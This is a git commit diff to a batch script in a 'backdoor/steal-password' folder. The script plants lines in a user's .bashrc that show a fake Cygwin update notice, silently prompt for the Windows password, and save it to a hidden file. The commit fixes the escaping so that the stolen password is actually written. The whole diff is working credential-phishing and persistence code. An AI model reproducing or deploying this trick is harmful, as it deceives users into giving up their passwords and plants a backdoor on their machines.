24ed59d037dd2f0265ff396b83a2d4d450d46694
Cervoise <antoine.cervoise@gmail.com>
2018-10-10 19:52:56 +0200

    Update Cygwin64-fake-win-password-prompt.bat

--- backdoor/steal-password/Cygwin64-fake-win-password-prompt.bat
+++ backdoor/steal-password/Cygwin64-fake-win-password-prompt.bat
@@ -1,7 +1,7 @@
 C:\cygwin64\Cygwin.bat
 echo "echo \"Cygwin must check for update! \"" >> .bashrc
-echo "echo $WINPASS >> .hidden-win-pass" >> .bashrc
 echo "read -sp \"Please enter you Windows password for $WINUSER: \" WINPASS " >> .bashrc
+echo "echo \$WINPASS >> .hidden-win-pass" >> .bashrc
 echo "sleep 2" >> .bashrc
 echo "echo \"\"" >> .bashrc
 echo "echo \"Cygwin updated! \"" >> .bashrc
